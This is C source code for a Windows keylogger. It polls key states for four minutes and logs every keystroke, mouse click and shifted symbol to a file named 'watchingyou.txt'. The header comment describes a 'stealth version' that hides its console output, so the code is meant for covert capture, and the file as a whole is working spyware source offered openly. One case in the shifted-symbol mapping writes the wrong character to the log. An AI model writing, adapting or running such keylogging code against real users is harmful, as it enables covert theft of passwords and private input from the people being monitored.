/*
Author:  Naomi Campbell
 
Physical key logger that runs for four minutes and captures user’s keystrokes
in real time. Two versions: a normal version (key logger for personal 
use with visible output to console) and a stealth version (which does not print 
to the console). Processes special characters and saves the output to a file 
with the date recorded.
*/

#include <stdio.h>
#include <windows.h>
#include <time.h>

boolean isSpecialKey(int k, FILE * fPtr); //function prototype
boolean isShiftSymbol(FILE * fPtr);

int main(void) {

	//create file to write to
	FILE *fPtr;
	fPtr = fopen("watchingyou.txt", "a+"); //append to the file; if doesn't exist, create
	//fPtr = fopen("PATH", "a+");
	
	time_t a;
	time(&a);
	fprintf(fPtr, "\n\n");
	printf("Today's date and time : %s\nBEGINNING NEW LOG:\n\n", ctime(&a));
	fprintf(fPtr, "Today's date and time : %s\nBEGINNING NEW LOG:\n\n", ctime(&a));

	//begin keylogger
	time_t t = time(NULL) + 240; //runs 4 mins
   do{
		if (time(NULL) >= t) { break; }
		Sleep(15); //cpu usage
		//loop through selected keys & see if pressed down
		for (int i = 1; i <= 222; i++) { //from backspace to apostrophe
			//if shift is down, check for special characters
			if (GetAsyncKeyState(i) == -32767) {
				if (isSpecialKey(i, fPtr) == FALSE) {
					fputc(i, fPtr);
					printf("%c", i);
				}
			}
			if ((GetAsyncKeyState(i) == 32768) && i == VK_SHIFT) {
				if (isShiftSymbol(fPtr) == TRUE) { continue; }
			}
			//this if stmt is last so doesn’t print *shift* first
			if (GetAsyncKeyState(i) == -32767 && i == VK_SHIFT) {
				printf("*shift*");
				fprintf(fPtr, "*shift*");
			}
		}
   } while( time(NULL) < t );
	fclose(fPtr);
}


/*
Method isSpecialKey will return false if input is not a special key.
If it is a special key, it will print key to file.
*/
boolean isSpecialKey(int k, FILE * fPtr) {
	switch (k) {
	case VK_LBUTTON: //int value 1, hex 0x01
		printf("[click]"); //print to console just to test
		fprintf(fPtr, "[click]");
		return TRUE; //break;
	case VK_RBUTTON: //int value 2, hex 0x02
		printf("[click]");
		fprintf(fPtr, "[click]");
		return TRUE; //break;
	case VK_BACK: //int value 8, hex 0x08
		printf("[backspace]");
		fprintf(fPtr, "[backspace]");
		return TRUE; //break;
	case VK_TAB: //int value 9, hex 0x09
		printf("[tab]");
		fprintf(fPtr, "[tab]");
		return TRUE; //break;
	case VK_RETURN: //int value 13, hex 0x0D
		printf("[enter]");
		fprintf(fPtr, "[enter]");
		return TRUE; //break;
	case VK_SHIFT: //int value 16, hex 0x10
	case VK_LSHIFT:
	case VK_RSHIFT:
		return TRUE; //break;
	case VK_CONTROL: //int value 17, hex 0x11
		printf("[ctrl]");
		fprintf(fPtr, "[ctrl]");
		return TRUE; //break;
	case VK_CAPITAL: //int value 20, hex 0x14
		printf("[capslock]");
		fprintf(fPtr, "[capslock]");
		return TRUE; //break;
	case VK_SPACE: //int value 32, hex 0x20
		printf(" ");
		fprintf(fPtr, " ");
		return TRUE; //break;
	case VK_OEM_PERIOD: //0xBE
		printf(".");
		fprintf(fPtr, ".");
		return TRUE; //break;
	case VK_OEM_COMMA: //0xBC
		printf(",");
		fprintf(fPtr, ",");
		return TRUE; //break;
	case VK_OEM_MINUS: //0xBD
		printf("-");
		fprintf(fPtr, "-");
		return TRUE; //break;
	case VK_OEM_1: //0xBA
		printf(";");
		fprintf(fPtr, ";");
		return TRUE; //break;
	case VK_OEM_7: //0xDE
		printf("'");
		fprintf(fPtr, "'");
		return TRUE; //break;
	case VK_OEM_2: //0xBF
		printf("/");
		fprintf(fPtr, "/");
		return TRUE; //break;
	default:
		return FALSE;
	}
}


/*
If shift key is down at the same time as a numeric key, record the alternative key instead
*/
boolean isShiftSymbol(FILE * fPtr) {
//loop through numberic keys
   //virtual keys --> 0x30-0x39 hex --> 48-57 decimal --> represent numeric keys 1-9
	for (int j = 48; j <= 57; j++) {
		if (GetAsyncKeyState(j) == -32767) {
			switch (j) {
			case 48:
				printf(")");
				fprintf(fPtr, ")");
				return TRUE; //break;
			case 49:
				printf("!");
				fprintf(fPtr, "!");
				return TRUE; //break;
			case 50:
				printf("@");
				fprintf(fPtr, "@");  
				return TRUE; //break;
			case 51:
				printf("#");
				fprintf(fPtr, "#");
				return TRUE; //break;
			case 52:
				printf("$");
				fprintf(fPtr, "#");
				return TRUE; //break;
			case 53:
				printf("%");
				fprintf(fPtr, "%");
				return TRUE; //break;
			case 54:
				printf("^");
				fprintf(fPtr, "^");
				return TRUE; //break;
			case 55:
				printf("&");
				fprintf(fPtr, "&");
				return TRUE; //break;
			case 56:
				printf("*");
				fprintf(fPtr, "*");
				return TRUE; //break;
			case 57:
				printf("(");
				fprintf(fPtr, "(");
				return TRUE; //break;
			//default:
			//	return FALSE;
			}
		}
	}
	return FALSE;
}
